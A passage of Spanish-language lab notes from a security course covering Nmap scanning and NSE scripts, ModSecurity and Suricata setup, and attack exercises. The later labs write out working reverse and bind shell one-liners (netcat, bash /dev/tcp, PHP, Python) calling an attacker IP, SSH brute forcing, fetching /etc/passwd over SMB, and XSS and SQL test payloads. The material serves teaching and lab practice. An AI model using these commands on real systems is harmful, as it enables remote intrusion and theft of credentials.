	- **`-PA` (TCP SYN/ACK):** útil cuando los firewalls bloquean las solicitudes ICMP. Acepta lista de puertos. Emula la respuesta ACK de una (falsa) conexión TCP. La respuesta a esto determinará si el destino existe
	- **`-PY` (Descubrimiento UDP):** Acepta lista de puertos. Envía un ping UDP al destino para ver si hay alguna respuesta
	- **`-Pn` (Don't ping):** útil si sabemos que hay cortafuegos bloqueando pings o pensamos que los objetivos están vivos. Omite la detección de hosts pero analiza sus puertos
	- **`PE` (ICMP echo):** generalmente se filtra, por lo que sólo funciona en algunas LAN. Usa los servicios de eco del protocolo ICMP para provocar una respuesta
	- **`-PP` (ICMP timestamp Ping):** puede evadir los cortafuegos si sólo filtran los paquetes ICMP Echo. Usa los servicios del protocolo ICMP para provocar una respuesta
	- **`-PO[lista de protocolos]` (IP Protocol Ping):** si no se especifica ninguno, se usa ICMP, IGMP e IP-in-IP. Puede evadir cortafuegos. Envía paquetes en un protocolo IP
	- **`-PM` (PM Address Mask Ping):** puede evadir los cortafuegos si sólo filtran los paquetes ICMP Echo. Usa los servicios del ICMP para provocar una respuesta
	- **`-sL` (Lista):** puede resolver el DNS de las direcciones IP que se le pasan. Simplemente enumera los objetivos a escanear
	- **`-PR` (Descubrimiento ARP Ping):** muy rápido, pero sólo funciona en redes LAN (las únicas que usan ARP). Usan el protocolo ARP para detectar objetivos
	- **`-sn` (Descubrimiento ping):** forma típica de detectar rápidamente hosts vivos. No escanea ningún puerto, sólo determina si está vivo
	- **`--traceroute` (Descubrimiento Traceroute):** si la ruta es correcta, el host existe. Obtiene una ruta al host
	- **`--system-dns` (Usar el DNS del sistema operativo):** hace la resolución de nombres DNS del objetivo mediante el DNS por defecto configurado en el sistema
	- **`-R` (Resolución obligatoria de DNS):** el valor predeterminado es hacer algunas resoluciones DNS. Siempre devuelve el nombre (`predeterminado` a veces)
	- **`-n` (Sin resolución DNS):** puede acelerar los análisis si los nombres DNS no son importantes. Nunca realiza la resolución DNS
	- **`--dns-servers <serv1[,serv2], ...>` (Especificar servidores personalizados):** realiza la resolución de nombres DNS de destino mediante el servidor DNS que se especifique
	- **`-PU` (Descubrimiento SCTP):** acepta listas de puertos. Usa el protocolo SCTP para tratar de provocar respuestas en los objetivos y ver si existen

## Tipos de escaneo Nmap y evasión básica de firewalls

- Útil si queremos descubrir hosts protegidos por un firewall, tratando de saltarse la protección del mismo
- Cheatsheet:
![[Pasted image 20230530154833.png]]

Este cheatsheet nos muestra nos muestra dos formas de escaneo avanzadas:
- El motor de script de Nmap, pero con otras categorías:
	- **discovery**: https://nmap.org/nsedoc/categories/discovery.html
	- **external**: https://nmap.org/nsedoc/categories/external.html
	- **version**: https://nmap.org/nsedoc/categories/version.html
- Técnicas avanzadas de análisis de puertos: trata de usar las técnicas más sigilosas para evitar ser bloqueado (no usar la opción `-O`)

- La siguientes técnicas son una extensión de las técnicas de escaneo del cheatsheet anterior:
	- **`-sA` (ACK scan)**: no determina si un puerto está abierto o cerrado. Sirve para saber si hay un firewall activo en el destino. Cualquier puerto independientemente de su estado responderá con un paquete RST. Si hay cortafuegos no habrá respuesta
	- **`-sl` (Idle scan)**: muy avanzado y sigiloso
	- **`-sO` (IP protocol scan)**: muy lento, identifica protocolos compatibles. Si responden con *unreachable* es que está cerrado el puerto
	- **`-sT` (TCP Connect)**: lento, ALTAMENTE DETECTABLE. Responde con puerto abierto o cerrado
	- **`-sS` (TCP SYN)**: la más popular. Rápido, BASTANTE SIGILOSO y no sobrecarga al objetivo. El equipo envía SYN y el remoto responde con puerto abierto o puerto cerrado
	- **`-sU` (UDP Scan)**: muy lento. Envía paquetes UDP a cada uno de los puertos destino. Que no haya respuesta no significa que el puerto esté cerrado
	- **`-sW` (Window scan)**: método POCO FIABLE. Usa el campo "Tamaño de ventana" del paquete TCP para determinar el tipo de sistema operativo
	- **`-sZ` (COOKIE-ECHO Scan)**: no se puede distinguir realmente entre puertos abiertos y puertos filtrados. Para entornos SCTP
	- **`-sY` (SCTP INIT Scan)**: rápido y SIGILOSO para el protocolo SCTP
	- **`--scanflags<flags>` (Custom TCP Scan Flags)**: posibles nombres de bits: URG, ACK, PSH, RST, SYN y FIN (`--scanflags URGACKPSHRSTSYNFIN` activa todos)
	- **`-sM` (Maimon Scan)**: alternativa al escaneo XMAS
	- **`-sF` (TCP FIN)**: se habilita el flag FIN del paquete TCP
	- **`-sN` (TCP Null)**: no se habilita ningún paquete del TCP
	- **`-sX` (TCP XMAS)**: Se habilitan los flag FIN, PSH y URG del paquete TCP
	- **`-b usuario:password@<Servidor_FTP>:21 <destino>` (Escaneo FTP bounce)**: se conecta al servidor FTP y envía archivos al destino
	- `-sR` (Exploración RPC): sólo si esperamos encontrar llamadas RPC en el sistema de destino
	- `-A` (Escaneo agresivo): lo más probable es que se filtre. EVITARLO
	- `-sC` (Análisis de script predeterminado): equivalente a `--script-default`. Arranca los scripts adecuados para cada puerto pertenecientes a la categoría NSE default
	- `-O` (Análisis de detección del SO): lo más probable es que se filtre. EVITARLO
	- `-sV` (Análisis de versiones): sondea puertos para determinar información.
![[Pasted image 20230530160934.png]]

## Ejemplos más avanzados de Nmap

- Para controlar los tiempos y su timing

- Ejemplos:
	- **Escaneo TCP SYN y UDP (requiere privilegios de root):** `nmap -sS -sU -Pn 192.168.13.37`
	- **Escaneo TCP SYN y UDP para todos los puertos reservados (requiere privilegios de root)**: `nmap -sS -sU -PN -p 1-1024 192.168.13.37`
	- **TCP Connect Scan**: `nmap -sT 192.168.13.37` DESACONSEJADO
	- **Análisis rápido:** `nmap -T4 -F 192.168.13.37` (-F escanea solo 100 puertos y rápido)
	- **Verbose:** `nmap -T4 -A -v 192.168.13.37`

![[Pasted image 20230530161707.png]]

## Detección de tipo de sistema operativo sin "ruido"

- Averiguar el SO de un objetivo sin ser detectado

- Para evitar ser detectados, hay que jugar con el TTL (tiempo de vida) de los paquetes que enviamos al sistema mediante `ping` de la forma: `ping -c 1 <IP o nombre del destino>`. Recibiremos una respuesta que indica un valor **ttl** y lo comprobamos en la siguiente tabla:
![[Pasted image 20230530162300.png]]

## Formatos de salida de Nmap

Hay 3 formatos:
- **Formato Nmap (`-oN <fichero>`):** estructura tradicional
- **Formato "Grepeable"(`-oG <fichero>`):** transforma la salida para usarla con `grep`
- **Formato XML (`-oX <fichero>`)**: formato en XML para ser importada en Metasploit.

## Nivel 3
## Nmap Scripting Engine (NSE)

- Tiene más de 600 scripts diferentes. Documentación en: https://nmap.org/nsedoc/
- Los scripts se instalan en `/usr/share/nmap/scripts` y los que hay disponibles en un momento se pueden enumerar mediante `locate *.nse*` -> `sudo apt install locate`
- Para fines de enumeración se recomiendan las siguientes categorías:
	- **discovery**: intentan descubrir de forma activa sobre la red consultando registros públicos, dispositivos que soportan el protocolo SNMP, servicios de directorio y similares. Ejemplos: `html-title`, `smb-enum-shares` (recursos compartidos con samba) y `snmp-sysdescr` (extrae detalles de sistemas remotos a través del protocolo SNMP)
	- **external**: pueden enviar datos a bases de datos de terceros u otros recursos de red. Ejemplo: `whois-ip`, que hace una conexión a los servidores WHOIS para saber más de la dirección del objetivo
	- **version**: son una extensión de la característica de detección de versiones de productos. Se ejecutan automáticamente sólo si se solicitó la detección de versiones (`-sV`). Ejemplos: `skypev2-version`, `pptp-version` e `iax2-version`

- Si no queremos examinar el contenido de cada categoría, podemos localizar scripts con el comando `locate` seguido de un `grep` para el servicio que deseamos buscar. Por ejemplo: 
	- `locate *.nse | grep smb`. Nota: si no funciona hacer `sudo updatedb`
	- `ls | grep smb` (en la carpeta contenedora de los scripts)
![[Pasted image 20230530164556.png]]

- No obstante, cada script tiene su propio conjunto de argumentos , por lo que hay que mirar su documentación.

## Técnicas de recopilación de información

### Métodos de autenticación SSH
- El script `ssh-auth-methods` localiza los métodos de autenticación aceptados por un servicio SSH de un objetivo. Uso recomendado: `sudo nmap -p22 --script ssh-auth-methods <IP-objetivo>`
![[Pasted image 20230530165622.png]]

### Fuerza bruta a servidores DNS
- El script `dns-brute.nse` encontrará registros DNS `A` válidos probando una lista de subdominios comunes y buscando los que se resuelven correctamente. Encuentra subdominios asociados con un dominio principal de una organización, que pueden revelar nuevos objetivos sobre los que realizar evaluaciones de seguridad. Ejemplo: `nmap -p 80 --script dns-brute.nse <IP_OBJETIVO>`
![[Pasted image 20230530170308.png]]

### Buscar hosts en una IP
- Encontrar hosts virtuales en la misma dirección IP (varios sitios web alojados en el mismo servidor). Esto se puede hacer mediante los scripts de `hostmap-*`. Ejemplo: `nmap -p 80 --script hostmap-bfk.nse <IP_OBJETIVO>`
![[Pasted image 20230530170753.png]]

### Geolocalización con traceroute
- El script `traceroute-geolocation.nse` realiza un `traceroute` a la IP de destino y proporciona datos de geolocalización de cada salto de esa ruta. Esto hace que se puedan correlacionar los nombres DNS inversos de los enrutadores en dicha ruta con ubicaciones físicas. Ejemplo: `sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 <IP_objetivo>`
![[Pasted image 20230530171104.png]]

### Geolocalización con bases de datos/servicios externos
- Hay una serie de scripts que ayudan a geolocalizar una IP mediante bases de datos o servicios externos. Ejmplo: `ip-geolocation-geoplugin` https://nmap.org/nsedoc/scripts/ip-geolocation-geoplugin.html ---- http://www.geoplugin.com
![[Pasted image 20230530172048.png]]

## Recopilación de información HTTP
### Métodos HTTP
- Descubre qué métodos HTTP admite un servidor enviando la petición `OPTIONS`. Enumera métodos HTTP potencialmente peligrosos https://nmap.org/nsedoc/scripts/http-methods.html. Ej: `sudo nmap -p80 --script http-methods <IP objetivo>`

### Captura del *banner* HTTP
- Una de las formas típicas de determinar los tipos de servicios y sus versiones es preguntarles directamente qué son. Esto lo hacen leyendo la información del servicio que proporcionan cuando se conecta con ellos, lo que se conoce como "*banner grabbing*" Ejemplo: `nmap --script banner <IP_OBJETIVO>`
![[Pasted image 20230530173155.png]]

### Rutas comunes HTTP
- El script `http-enum.nse`  encuentra rutas válidas en un servidor web por fuerza bruta para descubrir aplicaciones web que estén en uso. Ejemplos: `nmap --script http-enum <URL o IP objetivo>`, `nmap --script http-enum --script-args http-enum.basepath'pub/' <URL de destino o IP>`

### Títulos de servicios HTTP
- Este script agrega los títulos de las páginas web a los resultados de un análisis de Nmap para que se pueda tener un mejor contexto de un host que ejecuta servicios HTTP. Esto permite identificar fácilmente el propósito principal del servidor web y si ese servidor es un destino de ataque potencial. Ejemplo: `nmap --script http-title -sV -p 80 <red objetivo>

### Exploración de registros WHOIS
- Estos registros pueden tener información interesante, como el nombre real del propietario de un dominio, datos de contacto... aunque con frecuencia estos datos pertenecen a una empresa de hosting. Más información: https://nmap.org/nsedoc/scripts/whois-ip.html. Sintaxis: `nmap --script whois-ip <URL o IP de destino>`  
- Este script utiliza los datos de la IANA para encontrar una base de datos WHOIS y localizar la información que queremos. También podemos especificar el orden de servicios WHOIS que queremos utilizar: `nmap --script whois-ip –script-args whois.whodb-arin+ripe+afrinic <target IP>`. Podemos obtener más información en: https://nmap.org/nsedoc/scripts/whois-ip.html
![[Pasted image 20230530174538.png]]

## Malware y vulnerabilidades
### Malware
- Otra utilidad del NSE es saber si un host ha sido identificado como fuente de malware o distribuidor de phishing. Esto es gracias a la API de Safe Browsing de Google ya que el script `http-google malware` pide a ese servicio este tipo de información. Tenemos que crearnos una API key en http://code.google.com/apis/safebrowsing/key_signup.html. Una vez registrados: `nmap -p80 --script http-google-malware --script-args http-google-malware.api-<API key> <IP o dirección del objetivo>`
- Browsing de Google y VirusTotal también: `nmap -sV --script http-malware-host <URL o IP del objetivo>`
![[Pasted image 20230530175233.png]]

### Detección CVE  mediante Nmap. Scripts de terceros
- El script `--script vuln` ejecuta una prueba de vulnerabilidades completa contra nuestro objetivo. Ejemplo: `nmap -Pn --script vuln <URL o OP_OBJETIVO>`. Es algo lento y es mejor volcar su salida a un fichero
- Hay un script de terceros que mejora la salida (`nmap-vulners`).
- Para utilizar cualquier script de terceros sigue este procedimiento:
	- Descargar la carpeta o el archivo .nse del script en la carpeta de scripts NSE  (`/usr/share/nmap/scripts`). En nuestro caso concreto sería hacer `git clone https://github.com/vulnersCom/nmap-vulners.git` una vez estemos en dicha carpeta.  
	- Actualizar la base de datos de scripts nmap con `nmap --script-updatedb`
- Ejecuta el script con: `sudo nmap -sV --script=nmap-vulners/ <ip>`
![[Pasted image 20230530180707.png]]

## Nmap y Metasploit Framework (MSF)
- Integrar los resultados de un escaneo Nmap con Metasploit

- Es posible cargar cualquier escaneo de nmap en msf siempre que lo hayamos guardado en **xml**.

- Instala metasploit: `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall`

- Ejecuta metasploit con estos pasos:
	- Inicia la base de datos de MSF: `service postgresql start`
	- Inicia MSF: `msfdb init`
	- Arranca la consola de MSF: `msfconsole -q`

- Ahora puedes usar los siguientes comandos:
	- **db_import**: importar una salida de nmap en xml
	- **db_nmap:** esel propio nmap
	- **hosts**: máquinas identificadas 
	- **hosts -c address,purpose**: hosts mostrados en una columna de datos
	- **hosts -u**: mostrará sólo los hosts vivos
	- **services**: mostrará todos los servicios escaneados
	- **services -p 80**: sólo para los puertos indicados
	- **services -p tcp:** sólo para los protocolos indicados


## Escaneando en busca de archivos concretos

- Descargar el archivo phpinfo.php del rango IP 156.35.90.0 - 156.35.99.255:
```bash
#!/bin/bash
for ip_address in 156.35.9{0..9}.{0..255}; do
	wget -t 1 -T 5 http://${ip_address}/phpinfo.php;
done&
```
- Para descargar el fichero robots.txt de las direcciones 156.35.94.1 a 156.35.94.10 usaremos este script:
```bash
#!/bin/bash
for ip_address in 156.35.94.{1..10}; do
	wget -t 1 -T 5 http://${ip_address}/phpinfo.php;
done&
```
- Hay que darle permisos de ejecución y ya.

## Endpoints de servicios enarchivos JavaScript
- Para localizar servicios a los que se referencia desde el código JavaScript de una página web

- Los endpoints de servicios en archivos JavaScript son sitios típicos en los que la seguridad se relaja. Podemos utilizar el **tool photon** para extraer información de endpoints y mucho más que se guardará de un modo organizado:
	- URLs tanto dentro y fuera del ámbito así como direcciones URL con parámetros
	- Archivos JavaScript y endpoints presentes en ellos
	- Cadenas basadas en un patrón Ne personalizado
	- Datos de OSINT
	- Ficheros extraídos

- Para usar **photon** descargar en: https://github.com/s0md3v/Photon
	- Descargar dos librerías: `pip3 install tld requests`


## Github
- Para localizar secretos en repositorios públicos de Github
![[Pasted image 20230530185932.png]]

---
# Lab10 ⚱️

## Apache2 instalado como un proxy inverso

- Para aislar un servidor web de accesos desde el exterior de forma que haya un servicio accesible sin exponer el servidor real

- Uno de los principales componentes de una infraestructura son los **proxies inversos (reverse proxies)**. Son una barrera entre los clientes y los servicios prestados por la infraestructura.
	- De esta forma los clientes sólo pueden acceder a los servicios que se han creado para ser públicos. El resto de servicios no pueden ser localizados por ningún cliente. Los proxies inversos actúan como **puertas** a partes públicas de una infraestructura potencialmente mucho más compleja
	- Tenemos un único punto de defensa para múltiples servidores defendidos, ahorrando tiempo y haciendo especialización de recursos. De esta forma las máquinas defendidas sólo deben preocuparse por servir contenido

- Para instalar un apache2: `sudo apt install apache2`
- Para instalar un módulo para proxies: `sudo a2enmod proxy`
- Para instalar un módulo para proxies: `sudo a2enmod proxy_http`
- Para configurar Apache2 para que sirva como proxy inverso, editar el archivo `/etc/apache2/sites-enabled/000-default.conf` para que cada solicitud realizada desde "el frente" a este servidor proxy se redirija a cada servidor web "detrás" dependiendo de la URL especificada
- Para garantizar un proxy inverso **transparente** de las máquinas necesitamos utilizar las directivas `ProxyPass` y `ProxyPassReverse` sobre las IPs de la red interna. Ambos deben apuntar a la misma IP del servidor correspondiente. Por tanto, hay que crear dos entradas `Location` dentro del bloque `VirtualHost`:
```bash
<Location “/<URL>”> # Por ejemplo: “/eii”  
	ProxyPass “http://<Server IP>/”  
	ProxyPassReverse “http://<Server IP>/”  
</Location>
```
- Guarda y cierra el archivo y reinicia Apache2: `service apache2 restart`

## Instalación de un WAF

- Para proteger tus aplicaciones web contra varios tipos de amenazas sin cambiar el código fuente de la aplicación

- Instalar el WAF (Web Application Firewall) **mod_security2**: `sudo apt install libapache2-mod-security2`, para interceptar solicitudes entrantes dirigidas a nuestros sistemas protegidos.
- Ahora hay que configurar las reglas adecuadas para que el WAF funcione

### Instalar un OWASP ModSecurity Core Rule Set (CRS) actualizado
- Mover y cambiar el nombre de este archivo de ModSecurity: `sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf`
- Desde la MV descargamos la última versión de OWASP ModSecurity CRS: `git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git`
- Copia la carpeta descargada a `volume_datga/rules` de la infraestructura del lab10 (`/rules`)
- Una vez dentro del proxy, ve al directorio donde están las reglas descargadas y copia y cambia el nombre `crs-setup.conf.example` a `crs-setup.conf`
- Copia el directorio `rules/` también con su contenido:
	- `cd owasp-modsecurity-crs`
	- `cp crs-setup.conf.example /etc/modsecurity/crs-setup.conf`
	- `cp -r rules/ /etc/modsecurity/`
- Modificar el fichero `/etc/apache2/mods-available/security2.conf` para que coincida con la ruta de archivos descargados:
```bash
<IfModule security2_module>  
	# Default Debian dir for modsecurity's persistent data  
	SecDataDir /var/cache/modsecurity  
	
	# Include all the *.conf files in /etc/modsecurity.  
	# Keeping your local configuration in that directory  
	# will allow for an easy upgrade of THIS file and  
	# make your life easier  
	IncludeOptional /etc/modsecurity/*.conf  
	Include /etc/modsecurity/rules/*.conf  
</IfModule>
```
- Reinicia Apache2: `service apache2 restart`

### Comprueba que el WAF está funcionando

Para comprobar si ModSecurity en el proxy está dando protección a los servidores en el back-end, podemos realizar las siguientes pruebas:  
- Vete hasta la configuración predeterminada de Apache2 y agrega dos directivas adicionales en el archivo de configuración del sitio web predeterminado (`/etc/apache2/sites-enabled/000-default.conf`).  
	- La primera directiva habilita **ModSecurity** en modo de intercepción (**On** detecta amenazas entrantes y las bloquea) en lugar del modo de detección (**DetectionOnly** detecta amenazas entrantes pero **solo las registra en un log**, lo cual es útil cuando se prueba que el WAF no está bloqueando solicitudes legítimas).  
	- La segunda directiva agrega una nueva regla de prueba a ModSecurity que se incorporará al conjunto de reglas CRS. Esta regla es muy simple, y se activa cuando alguien usa el parámetro **testarg** en una URL con un valor que contiene la cadena **ssi**. La respuesta del WAF es denegar (**deny**) la solicitud que sirve una página de error con el estado HTTP 403 (status:403), registrando el incidente con el mensaje **"regla de prueba SSI disparada!"**. Este es solo un ejemplo simple de cómo se crean las reglas WAF, que también verifica que el motor de reglas funciona correctamente.
```bash
<VirtualHost *:80>  
	<Location ...>  
	... # Proxy configuration  
	</Location>  
		ServerAdmin webmaster@localhost  
		DocumentRoot /var/www/html  
		ErrorLog ${APACHE_LOG_DIR}/error.log  
		CustomLog ${APACHE_LOG_DIR}/access.log combined  
		...  
		SecRuleEngine On  
		SecRule ARGS:testarg "@contains ssi" "id:1234,deny,status:403,msg:'regla de prueba SSI disparada!'"  
</VirtualHost>
```
- Reinicia Apache2 y accede a la página. Si se carga correctamente, activa intencionadamente la regla para terminar esta parte del ejercicio.
- La segunda prueba que vamos a hacer es comprobar que las reglas CRS se están leyendo. Para ello, activamos aposta una advertencia de ataque de ejecución remota de comandos (RCE), creando una petición que coincida con las reglas CRS que evitan este tipo de ataques, como pasar un parámetro cualquiera con valor **/bin/bash**

### WAF contra "el mal"
- Cheatsheet para el **tool Nikto**:
![[Pasted image 20230531122345.png]]
- Otra prueba que podemos hacer es usar algunos de los scripts HTTP nmap NSE que probamos en el laboratorio anterior contra el proxy, y ver si el resultado cambia o los intentos son registrados por ModSecurity.

## WAF contra ataques web
- Para comprobar si el WAF está realmente bloqueando las peticiones

### XSS
- En lugar de pasar el ataque usando GET pondremos el payload del ataque como parámetro **POST** gracias a la opción `-d` del comando `curl` Para activar el WAF pasaremos una cadena de prueba XSS típica: `<script>alert('test')</alert>` con `curl <proxy IP>/-d "<script>alert('test')</script>"`
![[Pasted image 20230531130555.png]]

### Inyección SQL
- Pasamos como parámetro **POST** a los usuarios de la cadena `DROP DATABASE;` Comprueba que sólo identifica la sintaxis SQL correcta introduciendo errores tipográficos en la cadena proporcionada para ver si la captura o no
![[Pasted image 20230531130651.png]]

## NIDS Suricata

- Para detectar amenazas potenciales en tu red para que luego puedas tomar medidas contra ellas

- Las implementaciones serias usan infraestructuras y software mucho más complejo como **Security Onion**

### Security Onion y Suricata
- El **tool Suricata** monitoriza el tráfico de red y busca eventos de seguridad que puedan indicar un ataque o un compromiso. Suricata también forma parte de una distribución de Linux mucho más completa llamada **Security Onion** (https://securityonionsolutions.com/software/).

- Para usar Suricata:
	- Añadir los repositorios: `sudo add-apt-repository ppa:oisf/suricata-stable`
	- Actualizar los paquetes disponibles: `sudo apt update`
	- Instalarla: `sudo apt install suricata`

### Instalar y configurar Suricata
- **Suricata** es un sistema de detección de intrusos (IDS) basado en firmas, por lo que el siguiente paso es conseguir las reglas que le enseñen a lidiar con el tráfico. Para ello podemos utilizar las reglas Emerging Threats http://rules.emergingthreats.net/ . Es un repositorio gratuito de reglas Suricata. Para ello, hay que descargarse en la carptea `/volume_data/rules`:
	- `wget http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz`
	- Descomprímelas: `tar zxvf emerging.rules.tar.gz`
	- Datos interesantes:
		- **Archivos de configuración de Suricata**: `/etc/suricata/`. El principal que modificaremos es `/etc/suricata/suricata.yaml`
		- **Carpeta predeterminada de archivos de reglas de Suricata**: `/etc/suricata/rules/`
		- **Archivos de log de Suricata** (para ver qué amenazas identifica): `/var/log/suricata/`. El archivo `fast.log` contiene las reglas activadas. `eve.json` también es importante

### Configurar Suricata

- Modificar el fichero: `/etc/suricata/suricata.yaml`
	- Asegurarnos de que la IP a proteger es la que aparece en la variable `HOME_NET`
	- Cambiar el valor de esta variable a la IP de proxy que está en la misma red que el contenedor Kali atacante (lab10_front_net)
	- ![[Pasted image 20230531132037.png]]
	- Asegurate de que la interfaz de red que debe ser vigilada por Suricata es la correcta 
- Habilitar las reglas que Suricata va a utilizar para examinar el tráfico:
	- En el archivo anterior, el parámetro `default-rule-path` tiene como valor a la carpeta en la que copiamos las reglas Emerging Threats `default-rule-path: /var/lib/suricata/rules`
	 ![[Pasted image 20230531132705.png]]
	- Elegir las reglas que queremos activar y enumerarlas en una línea diferente (procedida por `-`) debajo de la entrada `rule-files` 
	 ![[Pasted image 20230531132912.png]]

### Probar la funcionalidad de Suricata
1. Conexión sospechosa desde el proxy al exterior del mismo (la máquina Ubuntu). Condiciones de la conexión:
	- **Necesita un destino de conexión**: crear uno fácilmente en nuestra máquina con `sudo apt install apache2`
	- **Falsifica una solicitud de un troyano conocido**: *ChilkatUpload* modificando el User-Agent de la solicitud. Ejecuta: `curl -A "ChilkatUpload" 198.168.102.1`
2. Realiza una solicitud desde fuera del proxy al propio proxy con un nmap ruidoso

## SCA y SAST

- Mirar en el guión 10

---
# Lab11 ⚱️

## Enumerar posibles archivos ocultos con información interesante (Exploit Public-Facing Application)

- Usaremos el **tool dirb**
- Cheatsheet de **dirb**
![[Pasted image 20230531221044.png]]
- Un escaneo simple con **dirb**: `dirb <url>`

## Exfiltración a través de directorios compartidos por SMB (Exploit Public-Facing Application)

- Para saber si un servidor expone ficheros interesantes a través de su funcionalidad de ficheros compartidos

- SMB es un protocolo para compartir carpetas, archivos e impresoras que funciona en varios SOs. Si se configura incorrectamente, se puede utilizar para obtener datos confidenciales de un sistema remoto simplemente haciendo una conexión para explorar los archivos expuestos de forma remota a través del protocolo SMB. Esta actividad consiste en usar los **tools SMBMap** o **smbclient** para obtener el archivo `/etc/passwd` de un sistema remoto.
- **SMBMap**: https://github.com/ShawnDEvans/smbmap, tutorial-> https://www.nopsec.com/smbmap-wield-it-like-the-creator/
- **smbclient**: https://www.cybrary.it/0p3n/easily-exploit-poorly-configured-smb

### smbclient

- Listar las carpetas compartidas para un sistema remoto: `smbclient -L fileserver`
![[Pasted image 20230531222501.png]]

### SMBMap

- Escaneo por defecto: `smbmap -H <ip_objetivo>`
![[Pasted image 20230531223345.png]]
- Enumerar un directorio particular: `smbmap -H <ip_objetivo> -r <directory>` 
![[Pasted image 20230531223329.png]]
- Una vez encontramos el fichero `/etc/passwd` lo descargamos: `smbmap -H <ip_objetivo> --download <archivo>`
![[Pasted image 20230531224001.png]]

## Diccionarios de contraseñas de palabras comunes contra objetivos concretos (Valid Accounts)

- Para saber si los usuarios que hay en un fichero de passwords usan contraseñas que son palabras que se encuentran en una web, y por tanto son fáciles de romper

- Vamos a generar una lista de palabras personalizada a partir del contenido de la página web de una víctima
- Cheatsheet para generar lista de palabras con el **tool cewl**:
![[Pasted image 20230531224324.png]]
- Tutorial sobre cómo usar cewl: https://esgeeks.com/como-utilizar-cewl/

- Ejemplo con caracteres mínimos y salida a fichero: `cewl -c -m 5 <ip_objetivo> -w <fichero>`

## Fuerza bruta con Nmap (Valid Accounts)

- Para saber si los usuarios de un servicio remoto  usan una clave de una lista de palabras que tienes, y por tanto, algunas cuentas de usuario son fáciles de romper

- Pasos:
	- Primero hacemos un escaneo rápido con Nmap: `sudo nmap -sV -sS <ip_objetivo>` ![[Pasted image 20230531224951.png]]
	- Localiza los scripts NSE adecuados que usen técnicas de fuerza bruta en `/usr/share/nmap/scripts`
	 ![[Pasted image 20230531225133.png]]
	 - Usa el hecho de que sabemos que un usuario válido en el sistema es `remotessiuser`
	 - SOLUCIÓN:
		 - Usaremos el script `ssh-brute`
		 - Usaremos el siguiente comando: `nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst <target>`![[Pasted image 20230531230035.png]]![[Pasted image 20230531230046.png]]
		 - Obtenemos la password `ingenieriainformatica`
		 - Nos podemos conectar por ssh ![[Pasted image 20230531230351.png]] ![[Pasted image 20230531230407.png]]

## Netcat como herramienta de escucha (Command & Scripting Interpreter)

- Para entender como funciona el **tool Netcat**

- Cheatsheet del **tool Netcat**:
![[Pasted image 20230531232009.png]]

- Para poner Netcat en modo escucha: `nc -lvp <port>`
- Para enviar una peticion a cualquier puerto: `telnet <ip> <port>`
![[Pasted image 20230531231745.png]]

## Bind shell con Netcat (Command & Scripting Interpreter)

- Para crear un bind shell en un sistema remoto y ejecutar comandos en él

- Para obtener un bind shell en la máquina remota:
	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
	- Luego escribiremos el siguiente comando en la máquina objetivo: `nc <ip_attacker> <port> -e /bin/bash` ![[Pasted image 20230531232648.png]]
	- Si ejecutamos: `python3 -c "import pty;pty.spawn('/bin/bash')"`, **obtenemos una shell completamente funcional**

## Reverse shell con Netcat (Command & Scripting Interpreter)

- Para crear una reverse shell en un sistema remoto y ejecutar comandos en él

- Para crear una reverse shell:
	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
	- Luego escribiremos el siguiente comando en la máquina objetivo: `bash -i >& /dev/tcp/<ip_attacker>/<port> 0>&1` ![[Pasted image 20230531233246.png]]

## Reverse shell sin Netcat (Command & Scripting Interpreter)

- Puedes crear un reverse shell en un sistema remoto y ejecutar comandos en el mismo netcat aunque netcat no esté disponible en el sistema remoto

- Para crear un reverse shell con **php**:
	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
	- Luego escribiremos el siguiente comando en la máquina objetivo: `php -r '$sock=fsockopen("<ip_attacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` ![[Pasted image 20230531234255.png]]
- Para crear un reverse shell con python:
	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
	- Luego escribiremos el siguiente comando en la máquina objetivo: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip_attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


## Searchploit (Exploitation for Client Execution)

- Para localizar exploits disponibles de una vulnerabilidad conocida gracias al **tool searchsploit**
- Tutorial: https://www.exploit-db.com/searchsploit

- Cheatsheet de Searchsploit:
![[Pasted image 20230531234850.png]]

- Para buscar los exploits de una máquina de una forma automatizada:
	- Hacer un escaneo nmap completo de lo que queramos y guardarlo en un xml: `sudo nmap -sV -sS <ip_objetivo> -oX <fichero.xml>`
	- Introducimos el siguiente comando en searchsploit: `searchsploit --nmap <fichero_nmap.xml>` ![[Pasted image 20230531235248.png]]
	- También podemos buscar el exploit equivalente en la web: https://www.exploit-db.com/


## GTFOBins para exfiltración de datos

- Para extraer información de un sistema remoto usando la técnica de los GTFOBin

- Esta técnica utiliza **binarios legítimos de sistema operativo** para hacer cosas diferentes a las que se supone que deben hacer.

- Ver tema 7 de teoría y usar esos comandos.

---
# Lab12 ⚱️

## Meterpreter para explotación (System Services)

### Iniciar MSF
- Para iniciar Metasploit:
	- Iniciar base de datos: `sudo service postgresql start`
	- Iniciar msf:  `sudo msfdb init`
	- Arranca la consola de MSF: `msfconsole -q`

### Uso básico de MSF
- Una vez arrancado `msf` debemos asegurarnos de que funciona bien. Para ello, escribimos `db_status` y debemos ver el siguiente mensaje:
![[Pasted image 20230601114015.png]]
- Ahora podemos empezar a organizar nuestras actividades usando los *workspaces*. Esto nos da la capacidad de guardar escaneos a diferentes **ubicaciones/redes/subredes**. 
- Si usamos el comando `workspace` desde **msfconsole** se mostrarán los espacios de trabajo que existen actualmente 
![[Pasted image 20230601114218.png]]
- Para crear un nuevo workspace: `workspace -a <nombre>`
- Para eliminar un workspace: `workspace -d <nombre>`
- Para cambiar de workspace: `workspace <nombre>`

### Entender la cadena típica de eventos de un exploit
- Cheatsheet de **Metasploit**:
![[Pasted image 20230601114515.png]]

